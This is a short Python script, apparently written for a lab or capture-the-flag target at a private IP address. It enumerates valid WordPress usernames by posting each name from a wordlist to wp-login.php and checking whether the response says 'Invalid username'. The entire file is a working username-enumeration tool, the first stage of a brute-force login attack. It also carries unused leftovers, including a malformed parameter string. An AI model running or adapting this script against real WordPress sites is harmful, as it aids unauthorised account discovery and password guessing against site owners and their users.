#!/usr/bin/python3
import requests
import pdb

with open ("users.txt.bk", "r") as f:
	usrdict = f.read()
usrdict = usrdict.split("\n")
for usr in usrdict:
	params= ("log{}&pwd=test&wp-submit=Log+In&testcookie=1".format(usr))
	payload = {'log':usr,'pwd':'123456'}
	headers = {'Content-Type' : 'application/x-www-form-urlencoded'}
	page = 'http://10.0.2.8/backup_wordpress/wp-login.php'
	cookies = dict(wordpress_test_cookie='WP+Cookie+check')
	r = requests.post(page,data=payload, headers=headers, cookies=cookies)
	if "Invalid username" not in r.text:
		#print (r.text)
		print(usr)
		break
